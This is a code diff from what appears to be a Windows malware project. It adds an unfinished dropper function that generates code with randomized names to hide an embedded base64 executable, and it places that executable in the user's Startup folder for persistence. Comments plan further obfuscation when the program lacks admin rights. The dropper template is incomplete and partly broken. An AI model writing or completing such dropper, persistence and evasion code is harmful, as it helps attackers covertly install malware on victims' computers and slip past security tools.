@@ -3,7 +3,7 @@ import subprocess
 import os
 import random
 import base64
-from Utils.helpers import is_os_64bit,run_pwsh,is_msvc_exist,download_file,extract_zip,get_current_file_path,base64_encode_file
+from Utils.helpers import is_os_64bit,random_string,run_pwsh,is_msvc_exist,download_file,extract_zip,get_current_file_path,base64_encode_file
 from .pyinstaller_obfuscate.obfuscationModule.main import Obfuscate
 from .pyinstaller_obfuscate.main import obfuscate_files
 
@@ -41,6 +41,26 @@ def persist_in_startup():
 
 
 
+def create_dropper():
+    """
+    if we don't obfuscated pyinstaller, and we don't have admin rights
+    we are gonna create a dropper with embedded base64 of our main exe.
+    this dropper is kind'a in stupid way
+    """
+    cuurent_file = get_current_file_path()
+    obfuscated_base64_name = random_string(random.randrange(8,17))
+    obfuscated_main_function = random_string(random.randrange(9,15))
+    obfuscated_file_var = random_string(random.randrange(7,17))
+    obfuscated_file_name = random_string(random.randrange(6,17))
+    obfuscated_startup_folder = f"c:/users/{os.getlogin()}/appdata/roaming/microsoft/windows/start menu/programs/startup/{obfuscated_file_name}"
+    dropper_code = f"""
+    import base64 as {obfuscated_base64_name}
+    file_str = {obfuscated_startup_folder}
+    def {obfuscated_main_function}():
+        with open({cuurent_file},'rb') as {obfuscated_file_var}:
+            info = {obfuscated_base64_name}.b64decode({obfuscated_file_var}.read())
+    """
+    #//TODO: ALOT OF THINGS ABOUT THIS, RE THINK IT ASAP
 def get_pyinstaller(pythonPath:str,admin=True):
     """
     :param str pythonPath: abs path to python.exe
@@ -75,6 +95,8 @@ def get_pyinstaller(pythonPath:str,admin=True):
         #assume your are not admin, but pyinstaller exist and you have msvc
         #TODO 6:// detect other C COMPILERS
         return
+    #IF WE GOT HERE. WE HAVE NO C COMPILERS AND NO ADMIN RIGHTS.
+    # WE SHOULD JUST OBFUSCATE OUR CODE,AND USE PYINSTALLER TO INSTALL IT.
 
     pass
 def pip_install(new_path=None):
